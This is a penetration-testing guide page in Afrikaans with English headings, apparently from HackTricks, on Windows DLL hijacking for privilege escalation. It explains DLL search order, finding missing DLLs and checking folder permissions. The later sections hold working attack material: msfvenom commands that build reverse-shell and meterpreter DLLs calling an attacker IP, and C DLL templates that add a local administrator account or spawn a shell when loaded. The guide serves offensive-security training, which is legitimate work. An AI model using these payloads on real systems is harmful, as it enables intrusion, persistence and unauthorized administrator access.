# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Basic Information

DLL Hijacking behels die manipulasie van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir kode-uitvoering, om volharding te bereik, en, minder algemeen, privilige-escalasie. Ten spyte van die fokus op escalasie hier, bly die metode van hijacking konsekwent oor doelwitte.

### Common Techniques

Verskeie metodes word gebruik vir DLL hijacking, elk met sy doeltreffendheid afhangende van die toepassing se DLL-laai strategie:

1. **DLL Replacement**: Om 'n egte DLL met 'n kwaadwillige een te vervang, opsioneel met DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Om die kwaadwillige DLL in 'n soekpad voor die wettige een te plaas, wat die toepassing se soekpatroon benut.
3. **Phantom DLL Hijacking**: Om 'n kwaadwillige DLL te skep vir 'n toepassing om te laai, terwyl dit dink dit is 'n nie-bestaande vereiste DLL.
4. **DLL Redirection**: Om soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers te wysig om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Om die wettige DLL met 'n kwaadwillige teenhanger in die WinSxS-gids te vervang, 'n metode wat dikwels geassosieer word met DLL side-loading.
6. **Relative Path DLL Hijacking**: Om die kwaadwillige DLL in 'n gebruiker-beheerde gids saam met die gekopieerde toepassing te plaas, wat lyk soos Binary Proxy Execution tegnieke.

## Finding missing Dlls

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te loop, **die volgende 2 filters in te stel**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

en net die **File System Activity** te wys:

![](<../../images/image (314).png>)

As jy op soek is na **ontbrekende dlls in die algemeen**, moet jy dit vir 'n paar **sekondes** laat loop.\
As jy op soek is na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare**, moet jy **'n ander filter soos "Process Name" "contains" "\<exec name>" instel, dit uitvoer, en stop om gebeurtenisse te vang**.

## Exploiting Missing Dlls

Om privilige te eskaleer, is die beste kans wat ons het om **'n dll te skryf wat 'n privilige proses sal probeer laai** in een van **die plekke waar dit gesoek gaan word**. Daarom sal ons in staat wees om **'n dll te skryf in 'n **gids** waar die **dll gesoek word voordat** die gids waar die **oorspronklike dll** is (vreemde geval), of ons sal in staat wees om **te skryf in 'n gids waar die dll gesoek gaan word** en die oorspronklike **dll bestaan nie** in enige gids nie.

### Dll Search Order

**Binne die** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word.**

**Windows-toepassings** soek na DLLs deur 'n stel **vooraf gedefinieerde soekpade** te volg, wat aan 'n spesifieke volgorde voldoen. Die probleem van DLL hijacking ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gidse geplaas word, wat verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom, is om te verseker dat die toepassing absolute pades gebruik wanneer dit na die DLLs verwys wat dit benodig.

Jy kan die **DLL soekorde op 32-bit** stelsels hieronder sien:

1. Die gids waaruit die toepassing gelaai is.
2. Die stelseldirectory. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funksie om die pad van hierdie gids te kry.(_C:\Windows\System32_)
3. Die 16-bit stelseldirectory. Daar is geen funksie wat die pad van hierdie gids verkry nie, maar dit word gesoek. (_C:\Windows\System_)
4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funksie om die pad van hierdie gids te kry.
1. (_C:\Windows_)
5. Die huidige gids.
6. Die gidse wat in die PATH omgewing veranderlike gelys is. Let daarop dat dit nie die per-toepassing pad insluit wat deur die **App Paths** register sleutel gespesifiseer is nie. Die **App Paths** sleutel word nie gebruik wanneer die DLL soekpad bereken word nie.

Dit is die **standaard** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, styg die huidige gids na die tweede plek. Om hierdie kenmerk te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (standaard is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soek in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens, let daarop dat **'n dll gelaai kan word wat die absolute pad aandui in plaas van net die naam**. In daardie geval sal daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, sal hulle gesoek word soos net gelaai deur naam).

Daar is ander maniere om die soekorde te verander, maar ek gaan dit hier nie verduidelik nie.

#### Exceptions on dll search order from Windows docs

Sekere uitsonderings op die standaard DLL soekorde word in Windows dokumentasie opgemerk:

- Wanneer 'n **DLL wat sy naam met een wat reeds in geheue gelaai is, deel**, die stelsel omseil die gewone soek. In plaas daarvan, voer dit 'n kontrole vir herleiding en 'n manifest uit voordat dit na die DLL wat reeds in geheue is, terugval. **In hierdie scenario, voer die stelsel nie 'n soek na die DLL uit nie**.
- In gevalle waar die DLL erken word as 'n **kenner DLL** vir die huidige Windows weergawe, sal die stelsel sy weergawe van die bekende DLL gebruik, saam met enige van sy afhanklike DLLs, **en die soekproses oorslaan**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie bekende DLLs.
- As 'n **DLL afhanklikhede het**, word die soek na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **modulename** aangedui is, ongeag of die aanvanklike DLL deur 'n volle pad geïdentifiseer is.

### Escalating Privileges

**Requirements**:

- Identifiseer 'n proses wat werk of sal werk onder **verskillende privilige** (horisontale of laterale beweging), wat **'n DLL ontbreek**.
- Verseker **skrywe toegang** is beskikbaar vir enige **gids** waarin die **DLL** gesoek gaan word. Hierdie ligging kan die gids van die uitvoerbare wees of 'n gids binne die stelselpaaie.

Ja, die vereistes is moeilik om te vind aangesien **dit per default 'n bietjie vreemd is om 'n bevoorregte uitvoerbare te vind wat 'n dll ontbreek** en dit is selfs **meer vreemd om skrywe toestemmings op 'n stelselpaaie gids te hê** (jy kan nie per default nie). Maar, in verkeerd geconfigureerde omgewings is dit moontlik.\
In die geval dat jy gelukkig is en jy voldoen aan die vereistes, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Alhoewel die **hoofdoel van die projek is om UAC te omseil**, kan jy daar 'n **PoC** van 'n Dll hijacking vir die Windows weergawe vind wat jy kan gebruik (waarskynlik net die pad van die gids waar jy skrywe toestemmings het, verander).

Let daarop dat jy **jou toestemmings in 'n gids kan nagaan** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer toestemmings van alle vouers binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die invoere van 'n uitvoerbare lêer en die uitvoere van 'n dll nagaan met:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te verhoog** met toestemmings om in 'n **Stelselpaaie-gids** te skryf, kyk:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Geoutomatiseerde gereedskap

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kyk of jy skryftoestemmings op enige gids binne die stelselpaaie het.\
Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek, is **PowerSploit funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

In die geval dat jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol te benut, om **'n dll te skep wat ten minste al die funksies wat die uitvoerbare sal invoer, uitvoer**. In elk geval, let daarop dat Dll Hijacking handig te pas kom om te [verhoog van Medium Integriteitsvlak na Hoë **(om UAC te omseil)**](../authentication-credentials-uac-and-efs.md#uac) of van [**Hoë Integriteit na SYSTEM**](#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll hijacking studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Boonop kan jy in die **volgende afdeling** 'n paar **basiese dll kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll met nie vereiste funksies ge-exporteer** te skep.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word**, maar ook om te **bloot te stel** en **te werk** soos **verwag** deur **alle oproepe na die werklike biblioteek te herlei**.

Met die hulpmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare program aandui en die biblioteek kies** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.

### **Meterpreter**

**Kry rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64 weergawe gesien):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let daarop dat in verskeie gevalle die Dll wat jy saamstel **verskeie funksies moet uitvoer** wat deur die slagofferproses gelaai gaan word, as hierdie funksies nie bestaan nie, sal die **binaire nie in staat wees om** hulle te laai nie en die **eksploit sal misluk**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Verwysings

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



{{#include ../../banners/hacktricks-training.md}}
